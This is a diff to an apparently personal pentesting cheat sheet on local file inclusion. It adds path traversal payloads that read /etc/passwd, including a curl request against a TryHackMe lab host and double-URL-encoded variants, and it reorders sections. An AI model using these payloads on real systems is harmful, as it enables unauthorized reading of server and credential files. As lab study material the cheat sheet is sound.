@@ -18,14 +18,23 @@
 
 **Examples**
 
-[team.md](../../walkthroughs/tryhackme/team.md "mention")
+[team.md](../../walkthroughs/tryhackme/team.md "mention")[#lfi](../../walkthroughs/tryhackme/vulnnet.md#lfi "mention")
 
 ```
 http://example.com/index.php?page=../../../etc/passwd
 http://dev.team.thm/script.php?page=/../../../../../etc/passwd
+curl -s http://vulnnet.thm/?referer=/etc/passwd 
 ```
 
-#### traversal sequences stripped non-recursively <a href="#traversal-sequences-stripped-non-recursively" id="traversal-sequences-stripped-non-recursively"></a>
+## From existent folder <a href="#from-existent-folder" id="from-existent-folder"></a>
+
+Maybe the back-end is checking the folder path:
+
+```
+http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
+```
+
+### Traversal sequences stripped non-recursively <a href="#traversal-sequences-stripped-non-recursively" id="traversal-sequences-stripped-non-recursively"></a>
 
 **Examples**
 
@@ -52,6 +61,10 @@ This is **solved since PHP 5.4**
 
 ## **Encoding** <a href="#encoding" id="encoding"></a>
 
+**Examples**
+
+[tokyo-ghoul.md](../../walkthroughs/tryhackme/tokyo-ghoul.md "mention")
+
 You could use non-standard encodings like double URL encode (and others):
 
 ```
@@ -61,15 +74,7 @@ http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
 
-## From existent folder <a href="#from-existent-folder" id="from-existent-folder"></a>
-
-Maybe the back-end is checking the folder path:
-
-```
-http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
-```
-
-## Exploring File System Directories on a Server <a href="#exploring-file-system-directories-on-a-server" id="exploring-file-system-directories-on-a-server"></a>
+## Exploring File System Directories on a Server <a href="#from-existent-folder" id="from-existent-folder"></a>
 
 The file system of a server can be explored recursively to identify directories, not just files, by employing certain techniques. This process involves determining the directory depth and probing for the existence of specific folders. Below is a detailed method to achieve this:
 
